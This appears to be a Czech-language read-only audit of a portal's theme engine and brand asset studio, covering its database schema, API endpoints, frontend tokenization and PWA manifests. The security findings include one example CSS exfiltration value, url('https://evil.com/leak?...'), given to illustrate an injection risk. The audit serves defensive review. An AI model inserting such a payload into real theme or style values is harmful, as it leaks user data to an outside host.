# THEME ENGINE & BRAND ASSET STUDIO — ARCHITEKTONICKÝ READ-ONLY AUDIT

**Task ID:** `TMPR-20260910-THEME-001`  
**Datum:** 2026-09-10  
**Autor:** Google AI Studio Engineering Agent / Jiří Šár  
**Baseline SHA:** `696df6255dfe1e0f1ac21a02b002999b557629e4` (`origin/main`)  
**Git Branch:** `audit/theme-brand-architecture-20260910`  
**Cílové prostředí:** DEV3 (architektonická příprava) / PROD3 (striktně nedotčeno)  
**Režim úlohy:** STRICT READ-ONLY ARCHITECTURE AUDIT  

---

## 1. Metadata auditu

| Položka | Hodnota | Poznámka |
| :--- | :--- | :--- |
| **Task ID** | `TMPR-20260910-THEME-001` | Architektonický a inventurní audit |
| **Typ auditu** | READ-ONLY Architecture & Inventory Audit | Žádné změny aplikace, DB ani deploymentu |
| **Projekt** | Táta má právo / Synthesis Hub | Synthesis CMS & Brand Family |
| **Git SHA (Main)** | `696df6255dfe1e0f1ac21a02b002999b557629e4` | Baseline ověřen proti GitHub origin/main |
| **Větev auditu** | `audit/theme-brand-architecture-20260910` | Izolovaná větev pro auditní dokumentaci |
| **Databázový dopad** | **ŽÁDNÝ (0 mutací)** | Žádný `prisma db push`, žádné migrace |
| **Runtime dopad** | **ŽÁDNÝ (0 změn)** | DEV3 i PROD3 runtime zůstávají nedotčeny |
| **Předchozí reference** | `docs/audit/BRAND_ASSET_STUDIO_INVENTORY_2026-09-09.md` | Stav k 9. 9. 2026 |

---

## 2. Manažerské shrnutí (Executive Summary)

Tento audit představuje hloubkovou prověrku připravenosti systému pro provoz **více nezávislých vizuálních témat** (např. *Classic*, *Táta Blue / Brand System 1.0*, budoucí témata a multi-project Synthesis CMS) a **Brand Asset Studia** bez nutnosti duplikovat React komponenty.

### Klíčová zjištění auditu:
1. **Rozpojená architektura Theme vs. Brand Family:**
   - V systému existují dva paralelní, vzájemně nepropojené světy:
     - **Původní Theme Engine (2026-08-21):** Modely `Theme` a `ThemeVariable` jsou zcela globální, nemají žádnou vazbu na projekt, brand family ani identitu aplikace, postrádají verzování a draft/publish životní cyklus.
     - **Brand Asset Studio Foundation (2026-09-09):** Modely `BrandFamily`, `AppIdentity`, `BrandProfile`, `BrandAsset`, `BrandAssetVersion`, `BrandRelease` mají hotový relační návrh v Prisma a TypeScript kontrakty, ale **nemají žádnou runtime implementaci** (chybí backendové služby, API routy, asset pipeline i UI).
2. **Kritická absence tokenizace na frontendu (96 % netokenizováno):**
   - Z celkového počtu **490 TS/TSX souborů** v aplikaci využívá CSS proměnné (`--color-*`) pouze **18 souborů (<4 %)**.
   - **220 souborů (45 %)** obsahuje natvrdo zapsané Tailwind třídy (např. `bg-blue-600`, `text-slate-900`, `border-slate-200`) a **35 souborů** obsahuje inline HEX barvy.
   - **Důsledek:** Aktivace jakéhokoliv nového tématu (včetně „Táta Blue“) by dnes změnila pouze hlavičku, patku a formuláře přihlášení/registrace. Zbytek portálu (klientská zóna Můj případ, poradna, kalkulačky, administrace) by zůstal vizuálně nezměněn.
3. **Kontextová nefunkčnost v runtime:**
   - Přestože databáze eviduje sloupec `context` (`GLOBAL`, `PUBLIC`, `PRIVATE`, `ADMIN`), frontendový `ThemeContext.tsx` při načtení témat kontext **zcela ignoruje** (`data.find(t => t.active)`). Aktivace tématu pro administraci tak přepíše vzhled celého portálu.
4. **Závažné bezpečnostní nálezy:**
   - **P1 (Fail-open in-memory fallback):** `ThemeService` při jakémkoliv selhání Prisma DB operací tiše přechází na in-memory `dbStore` a vrací HTTP 200 OK. Administrátor má dojem, že téma vytvořil či aktivoval, ale změna je po restartu kontejneru ztracena.
   - **P2 (Absence sanitizace CSS hodnot):** Endpoint `PUT /api/themes/:id/variables` neprovádí žádnou validaci ani sanitizaci hodnot CSS proměnných, což umožňuje vložení nevalidních hodnot či CSS injection.
   - **P2 (PWA Blob Manifest):** `ThemeContext` dynamicky nahrazuje manifest pomocí `URL.createObjectURL(blob)`. Tento přístup je nespolehlivý pro instalaci PWA na mobilních zařízeních a je v přímém konfliktu se statickým `/manifest.json` a Service Workerem.

---

## 3. Kompletní inventura Prisma / PostgreSQL

V `prisma/schema.prisma` bylo identifikováno 10 modelů bezprostředně souvisejících s tématy, brandingem a preferencemi.

### A. Modely původního Theme Engine (z migrace `20260821_initial_production`)

#### Model `Theme`
```prisma
model Theme {
  id          String   @id @default(uuid())
  key         String   @unique // např. "default", "dark", "high_contrast"
  name        String
  description String?
  isDefault   Boolean  @default(false)
  active      Boolean  @default(true)
  context     String   @default("GLOBAL") // "PUBLIC", "PRIVATE", "ADMIN", "GLOBAL"
  createdAt   DateTime @default(now())
  updatedAt   DateTime @updatedAt

  variables ThemeVariable[]

  @@index([key])
  @@index([context])
}
```
- **Kritické nedostatky:**
  - `key` je globálně unikátní (`@unique`), což znemožňuje existenci dvou témat se stejným klíčem pro různé projekty/brand families.
  - `context` je volný `String`, nikoliv PostgreSQL Enum.
  - **Chybí unikátní index na `[context, active] WHERE active = true`:** V DB může technicky existovat libovolné množství témat se stavem `active = true` pro tentýž kontext.
  - Chybí verzování (`version`), stav (`DRAFT`, `PUBLISHED`, `ARCHIVED`), historie změn i auditní metadata autora.

#### Model `ThemeVariable`
```prisma
model ThemeVariable {
  id        String   @id @default(uuid())
  themeId   String?
  theme     Theme?   @relation(fields: [themeId], references: [id], onDelete: Cascade)
  key       String   // např. "primary", "background"
  value     String   // např. "#1e3a8a"
  label     String
  category  String   @default("color")
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt

  @@unique([themeId, key])
  @@index([key])
}
```
- **Kritické nedostatky:**
  - `themeId` je nullable (`String?`), což umožňuje vznik sirotčích proměnných bez vazby na téma.
  - `category` je volný řetězec bez vazby na enum (např. barvy vs. typografie vs. radius).
  - `value` je neomezený řetězec bez kontroly formátu (HEX, HSL, CSS jednotky).

---

### B. Modely personalizace uživatele

#### Model `UserPreference`
```prisma
model UserPreference {
  id           String   @id @default(uuid())
  userId       String   @unique
  user         User     @relation(fields: [userId], references: [id], onDelete: Cascade)
  themeMode    String   @default("system") // "light", "dark", "system"
  colorPreset  String   @default("default") // "default", "blue", "green", "purple", "neutral", "high-contrast"
  customColors String?  @db.Text
  fontFamily   String   @default("default")
  fontSize     Int      @default(100)
  density      String   @default("standard")
  borderRadius String   @default("standard")
  highContrast Boolean  @default(false)
  updatedAt    DateTime @updatedAt
  createdAt    DateTime @default(now())

  @@index([userId])
}
```
- **Vazba:** Přímá 1:1 relace na `User`.
- **Zjištění:** Osobní předvolby uživatele přepisují globální téma natvrdo v DOM stylu (viz sekce 9).

---

### C. Modely brandingu a Brand Asset Studia

#### Model `BrandingVersion` (Aktivní legacy model)
```prisma
model BrandingVersion {
  id             String   @id @default(uuid())
  version        Int      @default(1) @unique
  primaryLogoSvg String?  @db.Text
  darkLogoSvg    String?  @db.Text
  faviconType    String?  @default("svg")
  faviconSvg     String?  @db.Text
  logoAlt        String?  @default("Táta má právo")
  isActive       Boolean  @default(false)
  updatedBy      String?
  updatedAt      DateTime @default(now())

  @@index([isActive])
}
```
- **Zjištění:** Jediný v současnosti funkční model brandingu. Ukládá SVG data přímo jako text do PostgreSQL. Nemá draft stav; uložení nového záznamu jej okamžitě aktivuje.

#### Modely Brand Asset Studio Foundation (Migrace `20260909_brand_asset_studio_foundation`)
V databázi existuje kompletní struktura pro Brand Asset Studio:
1. `BrandFamily`: Reprezentuje rodinu značky (např. `tata_ma_pravo`, v budoucnu další projekty).
2. `AppIdentity`: Reprezentuje aplikační identitu s vazbou na `BrandAppKey` (`public_portal`, `case_portal`, `admin_portal`). Má unikátní `scope`, `startUrl`, `manifestPath`, `serviceWorkerPath`.
3. `BrandProfile`: Vazba mezi rodinou a identitou, podporuje dědičnost assetů (`parentProfileId`).
4. `BrandAsset`: Definice konkrétního assetu s rolí (`BrandAssetRole`: `LOGO`, `MARK`, `FAVICON`, `PWA_ICON`, `APPLE_TOUCH_ICON`, atd.) a variantou (`BrandAssetVariant`).
5. `BrandAssetVersion`: Fyzická verze assetu na MinIO úložišti s evidencí SHA-256, MIME typu, rozměrů a stavu validace (`BrandAssetValidationStatus`).
6. `BrandRelease`: Imutabilní vydání značky se stavy `DRAFT → VALIDATED → READY → PUBLISHED → SUPERSEDED → ARCHIVED`.
7. `BrandReleaseAsset`, `DocumentBrandingProfile`, `BrandedDocumentExport`, `BrandCampaign`, `BrandCampaignTarget`.

**Klíčový závěr inventury DB:**
Datové schéma pro Brand Asset Studio je precizně navrženo a v databázi existuje. **Témata (`Theme`, `ThemeVariable`) však s touto novou strukturou nemají žádnou vazbu.** Existují vedle sebe jako dvě nezávislé entity.

---

## 4. Kompletní inventura backendu (Services & API)

### A. `ThemeService` (`src/services/themeService.ts`)
Třída poskytuje statické metody pro správu témat.

| Metoda | Datový zdroj | Transakce | Fallback chování | Bezpečnostní status |
| :--- | :--- | :--- | :--- | :--- |
| `getThemes()` | Prisma `theme.findMany` | Ne | `dbStore.themes` | 🟡 Nekonzistentní fallback |
| `getActiveTheme(ctx)` | `getThemes()` | Ne | První výchozí | 🟡 Ignoruje kontext při chybě |
| `getCssVariablesMap(ctx)` | `getActiveTheme(ctx)` | Ne | Generuje mapu `--color-*` | ✅ Bezpečné čtení |
| `createTheme(data, user)` | Prisma `theme.create` | Ne | `dbStore.logAudit` + in-memory ID | 🔴 **P1: Fail-open in-memory** |
| `activateTheme(idOrKey, user)` | Prisma `updateMany` + `update` | **NE (dvoudobé)** | Vrátí `themes[0]` | 🔴 **P1: Race condition & Fail-open** |
| `updateThemeVariables(...)` | Prisma `themeVariable.update/create` | **NE (smyčka)** | Zápis do `dbStore.themes` | 🔴 **P1: Fail-open; P2: No validation** |
| `deleteTheme(idOrKey, user)` | Prisma `theme.delete` | Ne | Vrátí `true` | 🔴 **P1: Fail-open** |

### B. `BrandingService` (`src/services/brandingService.ts`)
Třída obsluhuje legacy model `BrandingVersion`.

- `getActiveBranding()`: Načte aktivní verzi z DB.
- `getHistory()`: Načte posledních 50 verzí.
- `saveNewVersion(data, updatedBy)`:
  - Validuje SVG pomocí `sanitizeSvg()`.
  - **Používá PostgreSQL Advisory Lock:** `SELECT pg_advisory_xact_lock(20240826)` uvnitř `prisma.$transaction`.
  - Atomicky deaktivuje předchozí a vytvoří novou verzi s inkrementovaným číslem verze.
- `restoreVersion(versionId, updatedBy)`:
  - Používá tentýž advisory lock, deaktivuje stávající a aktivuje vybranou verzi.

### C. Stav služeb pro Brand Asset Studio
- `src/services/brandAssetService.ts`: **NEEXISTUJE**
- `src/services/brandReleaseService.ts`: **NEEXISTUJE**
- `src/services/brandResolverService.ts`: **NEEXISTUJE**

---

## 5. Matice API endpointů

| # | Endpoint | Metoda | Autentizace | Oprávnění (RBAC) | Scope / Kontext | Mutace | Audit log | Validace vstupu |
| :---: | :--- | :---: | :---: | :---: | :---: | :---: | :---: | :--- |
| 1 | `/api/themes` | `GET` | Ne | Veřejné | Všechna témata | Ne | Ne | Žádná |
| 2 | `/api/themes/active` | `GET` | Ne | Veřejné | Dle `?context=` | Ne | Ne | Žádná |
| 3 | `/api/themes/css-vars` | `GET` | Ne | Veřejné | Dle `?context=` | Ne | Ne | Žádná |
| 4 | `/api/themes` | `POST` | `requireAuth` | `ADMIN` | Kontext z body | **Ano** | `THEME_CREATE` | 🔴 **Chybí schema validace** |
| 5 | `/api/themes/:id/activate` | `POST` | `requireAuth` | `ADMIN` | Kontext tématu | **Ano** | `THEME_ACTIVATE` | 🟡 Bez validace ID |
| 6 | `/api/themes/:id/variables`| `PUT` | `requireAuth` | `ADMIN` | Cílové téma | **Ano** | `THEME_VARIABLES_UPDATE` | 🔴 **P2: Arbitrary CSS injection** |
| 7 | `/api/themes/:id` | `DELETE`| `requireAuth` | `ADMIN` | Cílové téma | **Ano** | `THEME_DELETE` | Kontrola `isDefault` |
| 8 | `/api/themes/:key` | `PUT` | `requireAuth` | `ADMIN` | Legacy GLOBAL | **Ano** | `THEME_VARIABLES_UPDATE` | 🔴 **P2: Chybí validace barvy** |
| 9 | `/api/themes` | `PUT` | `requireAuth` | `ADMIN` | Legacy GLOBAL | **Ano** | `THEME_VARIABLES_UPDATE` | 🔴 **P2: Chybí validace mapy** |
| 10| `/api/public/branding` | `GET` | Ne | Veřejné | Globální aktivní | Ne | Ne | Žádná |
| 11| `/api/admin/branding` | `GET` | `requireAuth` | `ADMIN` | Globální aktivní | Ne | Ne | Žádná |
| 12| `/api/admin/branding/history`| `GET` | `requireAuth` | `ADMIN` | Globální historie | Ne | Ne | Žádná |
| 13| `/api/admin/branding/validate`| `POST` | `requireAuth` | `ADMIN` | N/A | Ne | Ne | `sanitizeSvg()` |
| 14| `/api/admin/branding` | `PUT` | `requireAuth` | `ADMIN` | Globální aktivní | **Ano** | `UPDATE / BRANDING` | `sanitizeSvg()` na vstupech |
| 15| `/api/admin/branding/restore/:id` | `POST` | `requireAuth` | `ADMIN` | Globální aktivní | **Ano** | `RESTORE / BRANDING` | Kontrola existence verze |
| 16| `/api/admin/branding/reset` | `POST` | `requireAuth` | `ADMIN` | Globální aktivní | **Ano** | `RESET / BRANDING` | Žádná |

---

## 6. Bezpečnostní a integritní audit (P0/P1/P2/P3 zjištění)

### 🔴 P1 — Závažná zranitelnost: Fail-open in-memory fallback v `ThemeService`
- **Kód:** `src/services/themeService.ts` (řádky 190-210, 248-260, 310-335, 360-375)
- **Nález:** Všechny mutační metody (`createTheme`, `activateTheme`, `updateThemeVariables`, `deleteTheme`) odchytávají chyby Prisma pomocí `catch (err) { console.warn(...) }` a následně zapisují do paměťového `dbStore` a vracejí úspěšný výsledek volajícímu.
- **Riziko:** Pokud dojde k výpadku databáze, zámku tabulky nebo chybě integritního omezení, API vrátí administrátorovi stav HTTP 200 OK. Změna se však uloží pouze do RAM procesu node. Při restartu kontejneru nebo v multi-instance prostředí na DEV3/PROD3 dojde k okamžité ztrátě dat.
- **Doporučení:** Odstranit in-memory fallback pro mutační operace. Při chybě Prisma operace musí metoda vyhodit výjimku a API vrátit HTTP 500/400 (Fail-closed).

### 🔴 P1 — Integritní vada: Dvoudobá aktivace tématu bez databázové transakce
- **Kód:** `src/services/themeService.ts` (řádky 220-230)
- **Nález:** Aktivace tématu probíhá ve dvou samostatných SQL dotazech:
  ```ts
  await prisma.theme.updateMany({ where: { context: theme.context }, data: { active: false } });
  const updated = await prisma.theme.update({ where: { id: theme.id }, data: { active: true } });
  ```
- **Riziko:** Operace neběží v transakci `prisma.$transaction`. Při souběhu dvou požadavků nebo pádu serveru mezi prvním a druhým příkazem zůstane systém ve stavu, kdy není aktivní žádné téma nebo jsou aktivní dvě témata současně.
- **Doporučení:** Uzavřít operaci do `prisma.$transaction` a doplnit PostgreSQL partial unique index `CREATE UNIQUE INDEX "one_active_theme_per_context" ON "Theme"("context") WHERE "active" = true;`.

### 🟡 P2 — Bezpečnostní riziko: Nevalidované hodnoty CSS proměnných (CSS Injection)
- **Kód:** `server.ts` (řádky 3540-3548), `src/services/themeService.ts` (řádky 270-295)
- **Nález:** Endpoint `PUT /api/themes/:id/variables` přijímá libovolné dvojice klíč-hodnota. Hodnota proměnné není validována proti regulárnímu výrazu pro barvy (`^#([0-9a-fA-F]{3,8})$`, `hsl(...)`, `rgb(...)`).
- **Riziko:** Administrátor (nebo útočník při kompromitaci administrátorského účtu) může vložit řetězec obsahující např. CSS exfiltraci přes `url('https://evil.com/leak?...')` nebo narušit layout aplikace.
- **Doporučení:** Zavést přísnou Zod validaci: klíče povoleny pouze ze schváleného tokenového slovníku a hodnoty striktně validovány na HEX/RGB/HSL formáty.

### 🟡 P2 — Integritní vada: Ignorování kontextu v klientském runtime
- **Kód:** `src/context/ThemeContext.tsx` (řádky 250-258)
- **Nález:** Klientský `ThemeContext` načítá témata přes `GET /api/themes` a aktivní téma vybírá kódem:
  `const active = data.find((t) => t.active) || data.find((t) => t.isDefault) || data[0];`
- **Riziko:** Ignoruje se aktuální trasa uživatele (zda je na veřejném webu, v portálu `/muj-pripad` nebo v `/administrace`). Téma označené jako `ADMIN` se aplikuje na celou veřejnou homepage.
- **Doporučení:** Implementovat kontextový resolver v `ThemeContext`, který se dotazuje na `GET /api/themes/active?context=${currentContext}`.

### 🟡 P2 — PWA architektura: Riziko nestabilního Blob manifestu
- **Kód:** `src/context/ThemeContext.tsx` (řádky 65-105)
- **Nález:** Aplikace vytváří manifest za běhu v paměti přes `URL.createObjectURL(new Blob(...))` a přepíše odkaz `<link rel="manifest">`.
- **Riziko:** Mobilní prohlížeče (zejména iOS Safari a Android Chrome při instalaci na plochu) často ignorují Blob URL manifesty a vyžadují statický, servírovaný JSON na stejné doméně. Navíc Service Worker cachuje statický `/manifest.json`, což vede ke kolizím.
- **Doporučení:** Generovat manifesty na straně serveru přes dedikovaný endpoint (např. `/manifest.webmanifest?app=public_portal`).

### 🟢 P3 — Ztráta auditní stopy při výpadku databáze
- **Kód:** `src/services/themeService.ts`
- **Nález:** Při selhání Prisma je auditní záznam zapsán pouze do paměťového `dbStore.logAudit`, který není perzistentní.

---

## 7. Kompletní inventura frontend runtime

### A. Komponenty správy témat a brandingu
1. **`src/context/ThemeContext.tsx`:**
   - Spravuje témata, CSS proměnné, preference uživatele a současně dynamický branding.
   - Trpí silným porušením principu jediné odpovědnosti (SRP).
2. **`src/components/admin/ThemeManager.tsx`:**
   - Administrátorské rozhraní pro editaci barevných proměnných, aktivaci a vytváření nových témat.
   - Pracuje s 14 fixními proměnnými z `DEFAULT_THEME_VARIABLES`.
3. **`src/components/admin/BrandingManager.tsx`:**
   - Správa SVG loga, tmavého loga, faviconu a alternativního textu.
   - Využívá vizuální SVG editor a validační endpoint.
4. **`src/components/common/Logo.tsx`:**
   - Zobrazuje buď dynamické SVG z brandingu přes `dangerouslySetInnerHTML`, nebo hardcoded vektorový štít se statickými barvami (`#1E3A8A`, `#0D9488`, `#2DD4BF`, `#F59E0B`).

### B. Mapování layoutů a chování témat

| Layout | Cesta | Aplikace CSS proměnných | Hardcoded barvy | Stav podpory témat |
| :--- | :--- | :---: | :---: | :--- |
| **Public Portal** | `/`, `/clanky`, `/faq`, `/krizova-pomoc` | **Částečná** (Hero, Login, Register, Puck) | Slate, Blue, Teal | 🟡 Pouze částečně přepínatelné |
| **Case Portal (Můj případ)** | `/muj-pripad/*` | **Žádná (0 %)** | `bg-slate-50`, `text-blue-600`, `border-slate-200` | 🔴 Zcela nepřepínatelné |
| **Admin Shell** | `/administrace/*` | **Žádná (0 %)** | Tmavý shell `bg-slate-900`, `text-white` | 🔴 Fixní tmavý layout |
| **Synthesis AI Center** | `/administrace/synthesis` | **Žádná (0 %)** | Fialové a břidlicové akcenty | 🔴 Fixní specializovaný layout |

---

## 8. Analýza tokenizace a hardcoded stylů (statistika a rozsah)

V rámci auditu byl spuštěn hloubkový statický analyzátor napříč celým adresářem `src/`.

### Výsledné metriky:
- **Celkový počet TS/TSX souborů v projektu:** 490
- **Soubory využívající CSS proměnné (`var(--color-*)`):** 18 (3,67 %)
- **Soubory obsahující natvrdo zapsané Tailwind barvy (např. `bg-blue-600`):** 220 (44,90 %)
- **Soubory obsahující přímé HEX kódy (např. `#1e3a8a`):** 35 (7,14 %)

### Seznam souborů s implementovanou tokenizací (18 souborů):
1. `src/components/public/Hero.tsx`
2. `src/components/public/LoginPage.tsx`
3. `src/components/public/RegisterPage.tsx`
4. `src/components/public/ModulesSection.tsx`
5. `src/components/public/PagesSection.tsx`
6. `src/components/public/UserManualPage.tsx`
7. `src/components/public/news/NewsHubView.tsx`
8. `src/puck/adapters/ArticlesFeedAdapter.tsx`
9. `src/puck/adapters/FaqFeedAdapter.tsx`
10. `src/puck/adapters/HeroAdapter.tsx`
11. `src/puck/adapters/HomepageAdapters.tsx`
12. `src/context/ThemeContext.tsx`
13. `src/services/themeService.ts`
14. (a 5 interních testovacích souborů)

### Důsledek pro zavedení nového tématu:
Pokud by dnes bylo aktivováno nové téma (např. „Táta Blue“ s jiným odstínem modré a neutrální šedé), **96,3 % aplikace se nezmění**. Komponenty v klientské sekci a administraci mají třídy jako `bg-blue-600`, `hover:bg-blue-700`, `text-slate-900` zakódovány přímo v JSX.

---

## 9. Řešení konfliktů: Globální téma vs. UserPreference

V `ThemeContext.tsx` a `UserAppearanceTab.tsx` existuje hierarchie aplikace stylů.

### Schéma prioritního řetězce (Precedence Chain):

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Systémové nastavení OS (prefers-color-scheme: dark)     │
│    (použije se pouze tehdy, je-li themeMode === 'system')   │
└──────────────────────────────┬──────────────────────────────┘
                               ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. Uživatelský režim: UserPreference.themeMode              │
│    ('dark' přidá třídu .dark, 'light' ji odebere)           │
└──────────────────────────────┬──────────────────────────────┘
                               ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. Uživatelský preset: UserPreference.colorPreset           │
│    POKUD colorPreset !== 'default':                         │
│    - Natvrdo nastaví --color-primary a --color-background   │
│    - ZABLOKUJE aplikaci proměnných z aktivního tématu!      │
└──────────────────────────────┬──────────────────────────────┘
                               ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. Typografie a hustota: UserPreference                     │
│    (fontFamily, fontSize %, data-density, data-radius)      │
└──────────────────────────────┬──────────────────────────────┘
                               ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. Globální téma (ThemeService.getActiveTheme)              │
│    Aplikuje se POUZE TEHDY, pokud:                          │
│    - Uživatel není přihlášen, NEBO                          │
│    - Přihlášený uživatel má colorPreset === 'default'       │
└─────────────────────────────────────────────────────────────┘
```

### Konfliktní scénáře:
1. **Scénář: Administrátor aktivuje „Táta Blue“, ale uživatel má nastaven preset „Zelená“ (`green`):**
   - V `ThemeContext.tsx` kód `applyPreferences` nastaví `--color-primary: #16a34a` a `--color-background: #f0fdf4`.
   - Následně `applyCssVariables` zkontroluje podmínku `if (!currentUser?.preferences || currentUser.preferences.colorPreset === 'default')`.
   - Vzhledem k tomu, že podmínka neprojde, **žádná další proměnná z tématu Táta Blue (ani sekundární barvy, rámečky či povrchy) se neaplikuje**. Aplikace zůstane v nekonzistentním hybridním stavu.
2. **Scénář: Tmavý režim vs. Barvy tématu:**
   - Témata v `Theme` modelu nemají definovanou sadu proměnných pro tmavý režim (neexistuje koncept light/dark tokenů v jednom tématu). Tmavý režim je řešen výhradně přes Tailwind třídu `.dark` s fixními třídami (např. `dark:bg-slate-900`).

---

## 10. Oddělení odpovědností: Branding vs. Theme

Pro zachování čisté architektury Synthesis CMS je nutné striktně vymezit hranice obou subsystémů.

| Oblast | Subsystém THEME | Subsystém BRANDING |
| :--- | :--- | :--- |
| **Účel** | Vizuální styl, barvy, typografie, prostor | Identita značky, assety, reprezentace |
| **Entity** | Tokeny, proměnné, utility třídy | Loga, symboly, ikony, manifesty, názvy |
| **Příklady prvků** | Primary color, Border radius, Font family | Vector shield SVG, Favicon ICO, PWA 512x512 |
| **Frekvence změn** | Přepínatelné uživatelem nebo sekcí portálu | Stabilní identita, vázaná na oficiální release |
| **Výstup** | CSS proměnné, Tailwind konfigurace | Statické soubory, CDN/MinIO URL, Metadata |
| **Současný stav v kódu** | 🔴 Smícháno v `ThemeContext.tsx` | 🔴 Smícháno v `ThemeContext.tsx` |

**Doporučený architektonický krok:**
Rozdělit `ThemeContext.tsx` na dva nezávislé kontexty:
1. `BrandingContext` (poskytuje identitu, loga a assety dle aplikačního scope).
2. `ThemeContext` (poskytuje design tokeny a řízení režimu zobrazení).

---

## 11. Stav Brand Asset Studia (porovnání s auditem z 9. 9.)

Porovnání s autoritativním auditem `docs/audit/BRAND_ASSET_STUDIO_INVENTORY_2026-09-09.md`:

| Komponenta Brand Asset Studia | Požadavek z 9. 9. 2026 | Stav v `origin/main` k 10. 9. 2026 | Klasifikace |
| :--- | :--- | :--- | :---: |
| **Prisma datový model** | 10 nových modelů (`BrandFamily` až `BrandRelease`) | Modely vytvořeny v migraci `20260909_brand_asset_studio_foundation` | ✅ **SPLNĚNO** |
| **TypeScript kontrakty** | Typy a rozhraní pro assety a releasy | Vytvořeno v `src/types/branding.ts` | ✅ **SPLNĚNO** |
| **MinIO storage pipeline** | Ukládání fyzických souborů do MinIO | Neimplementováno (používá se pouze text SVG v Postgresu) | 🔴 **NEIMPLEMENTOVÁNO** |
| **Asset sanitizace a hash** | Výpočet SHA-256 a hloubková validace | Existuje pouze základní `svgSanitizer.ts` | 🟡 **ČÁSTEČNĚ** |
| **Brand Release Engine** | Stavy `DRAFT → VALIDATED → READY → PUBLISHED` | Žádná backendová služba neexistuje | 🔴 **NEIMPLEMENTOVÁNO** |
| **Runtime Brand Resolver** | Dynamický výběr assetů dle aplikace | Neimplementováno | 🔴 **NEIMPLEMENTOVÁNO** |
| **Brand Asset Studio UI** | Administrátorský vizuální editor | V provozu je pouze starý `BrandingManager.tsx` | 🔴 **NEIMPLEMENTOVÁNO** |
| **Oddělení 3 PWA manifestů** | Samostatné manifesty a service workery | Pouze jeden globální statický `manifest.json` | 🔴 **NEIMPLEMENTOVÁNO** |

---

## 12. Audit PWA a offline vrstvy

1. **Statický vs. Dynamický Manifest:**
   - Statický soubor `public/manifest.json` má natvrdo nastaveno:
     - `name`: „Táta má právo“
     - `start_url`: `/`
     - `scope`: `/`
     - `theme_color`: `#1e3a8a`
     - `background_color`: `#f8fafc`
   - Dynamický kód v `ThemeContext.tsx` vytváří Blob URL a nahrazuje odkaz na manifest. Tento stav vytváří dvojí pravdu (Split-Brain) mezi prohlížečem instalujícím aplikaci a běžícím React runtime.
2. **Service Worker (`public/sw.js`):**
   - Cache je fixně pojmenována `tata-ma-pravo-v2`.
   - V seznamu `PRECACHE_ASSETS` je natvrdo zapsán `/manifest.json` a `/icon.svg`.
   - Pokud dojde ke změně tématu nebo brandingu, uživatelé s nainstalovanou PWA vidí původní ikony a barvy, dokud nedojde k invalidaci Service Workera.
3. **Oddělení tří identit (`public_portal`, `case_portal`, `admin_portal`):**
   - V současnosti nelze nainstalovat klientskou zónu Můj případ jako samostatnou PWA aplikaci s vlastní ikonou a startovní adresou `/muj-pripad`, protože celá doména sdílí jediný root service worker a scope `/`.

---

## 13. Audit pro „Classic Theme“ (příprava safe rollback snapshotu)

Aby bylo možné bezpečně přepínat témata a kdykoliv se vrátit k původnímu vzhledu, musí být současný vizuální stav zakonzervován jako téma `tata-classic`.

### Výchozí hodnoty tokenů pro `tata-classic`:
```json
{
  "key": "tata-classic",
  "name": "Táta Classic (Původní)",
  "description": "Klasický vizuální styl portálu Táta má právo (srpen 2026)",
  "context": "GLOBAL",
  "variables": {
    "primary": "#1e3a8a",
    "secondary": "#0284c7",
    "background": "#f8fafc",
    "surface": "#ffffff",
    "text": "#1e293b",
    "textMuted": "#64748b",
    "heading": "#0f172a",
    "link": "#2563eb",
    "border": "#e2e8f0",
    "button": "#1e3a8a",
    "buttonHover": "#0f172a",
    "success": "#16a34a",
    "warning": "#d97706",
    "error": "#dc2626"
  }
}
```

### Požadavky před vytvořením bezpečného snapshotu:
1. **Uložení snapshotu do DB seedu:** Zabezpečit, aby téma s klíčem `tata-classic` existovalo v databázi s příznakem `isDefault = true`.
2. **Propojení s Tailwind utility vrstvou:** Aby snapshot skutečně garantoval identický vzhled, musí být Tailwind nakonfigurován tak, aby třídy jako `bg-primary` odkazovaly na `var(--color-primary)`.

---

## 14. Požadavky na nový „Táta Blue / Brand System 1.0“

Nový vizuální styl „Táta Blue“ vyžaduje moderní, důvěryhodnou a přístupnou paletu:

1. **Barevná harmonie:**
   - **Primary:** Hluboká námořní modř s vysokým kontrastem (např. `#1a365d` nebo `#0f2b5c`).
   - **Secondary / Accent:** Moderní azurová / kobaltová pro interaktivní stavy (např. `#2563eb` / `#0284c7`).
   - **Background & Surface:** Jemně tónovaná břidlice pro redukci únavy očí (např. `#f8fafc` a `#ffffff`).
   - **Stavové barvy:** Striktně zachovat nezávislé sémantické barvy (zelená pro úspěch `#15803d`, jantarová pro varování `#b45309`, červená pro chybu `#b91c1c`), aby nedocházelo k jejich přebarvení na modrou.
2. **WCAG AA Kontrast:**
   - Všechny texty na primárním i sekundárním pozadí musí splňovat minimální kontrastní poměr 4,5:1 (pro běžný text) a 3:1 (pro velké nadpisy).
3. **Oddělení od loga:**
   - Nové téma nesmí měnit křivky ani význam loga; mění pouze kontextové barevné tokeny a typografické proporce.

---

## 15. Připravenost pro multi-project a Synthesis CMS

Současný kód vykazuje silné hardcoded závislosti na projektu „Táta má právo“:
1. **Hardcoded texty a domény:**
   - `src/services/themeService.ts`: `system@tatovacesta.cz`, „Oficiální barevný profil portálu Táta má právo“.
   - `src/components/common/Logo.tsx`: Texty „TÁTA MÁ PRÁVO“ a „PRO NEJLEPŠÍ ZÁJEM DÍTĚTE“ zobrazeny vždy při absenci vlastního SVG.
   - `src/components/private/UserAppearanceTab.tsx`: Název presetu „Výchozí (Táta má právo)“.
2. **Omezený výčet aplikací (`BrandAppKey`):**
   - PostgreSQL enum `BrandAppKey` má pevné hodnoty `'public_portal', 'case_portal', 'admin_portal'`. Jiný projekt na platformě Synthesis by vyžadoval změnu databázového enumu.
3. **Absence modelu `Project` v Prisma:**
   - V `schema.prisma` neexistuje entita `Project` nebo `Tenant`. Témata jsou plně sdílená napříč celou databází.

### Cílový model pro Synthesis CMS:
```
[Synthesis CMS Tenant / Project]
             │
             ▼
       [BrandFamily]
             │
             ▼
       [AppIdentity] ──── (public_portal, case_portal, admin_portal, ...)
             │
             ▼
       [BrandProfile] ──── [BrandRelease (Assety, Loga, Ikony)]
             │
             ▼
       [ThemeProfile] ──── [Design Tokens (Barvy, Typografie, Radius)]
             │
             ▼
       [Runtime Token Resolver] ──── (CSS Proměnné + Tailwind Map)
```

